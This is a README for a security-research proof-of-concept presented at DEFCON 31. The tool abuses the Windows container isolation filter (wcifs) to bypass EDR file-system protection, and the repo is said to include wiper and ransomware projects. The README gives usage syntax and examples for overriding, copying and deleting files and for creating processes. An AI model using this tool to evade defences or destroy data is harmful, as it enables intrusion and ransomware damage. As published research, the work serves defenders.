
# ContainYourself
A PoC of the ContainYourself research, presented on [DEFCON 31](https://forum.defcon.org/node/245719).
This tool abuses the Windows containers framework to bypass EDR file-system-based malware protection, file write restrictions, and ETW-based correlations.

This repo contains a static library that implements the research findings, a PoC tool that utilizes the library, and a wiper & ransomware projects.

https://www.deepinstinct.com/blog/contain-yourself-staying-undetected-using-the-windows-container-isolation-framework

## Installation
Make sure to clone the repository and its submodules:

    git clone --recursive git@github.com:deepinstinct/ContainYourself.git

## Usage

    Usage: ContainYourselfPoc.exe [--command]
    
    Valid commands:
            --set-reparse [override|link] - Set wcifs reparse tag
            --remove-reparse [override|link] - Remove wcifs reparse tag
            --override-file - override a file using wcifs
            --copy-file - Copy a file using wcifs
            --delete-file - Delete a file using wcifs
            --create-process - Create process from an image file path using NtCreateUserProcess
    Commands arguments:
            --source-file  - operation full source file (relative to volume only when using with [--copy-file])
            --target-file  - operation target file (relative to volume)
            --source-volume  - operation source volume, without a trailing backslash (default is C:)
            --target-volume  - operation target volume, without a trailing backslash (default is C:)
    
    Examples:
            ContainYourselfPoc.exe --set-reparse override --source-file C:\temp\calc.exe --target-file \temp\malware.exe
            ContainYourselfPoc.exe --remove-reparse --source-file C:\temp\calc.exe
            ContainYourselfPoc.exe --override-file --source-file C:\temp\calc.exe
            ContainYourselfPoc.exe --copy-file --source-file temp\document.docx --target-file Documents\document.docx --target-volume E:
            ContainYourselfPoc.exe --delete-file --source-file C:\temp\document.docx

## Disclaimer

Every security product has the capability to incorporate its unique algorithm designed to counter ransomware and wiper threats. It cannot be guaranteed that this proof-of-concept will successfully circumvent every existing protection solution available.

## Credits

* [Daniel Avinoam](https://twitter.com/daniel_avinoam)

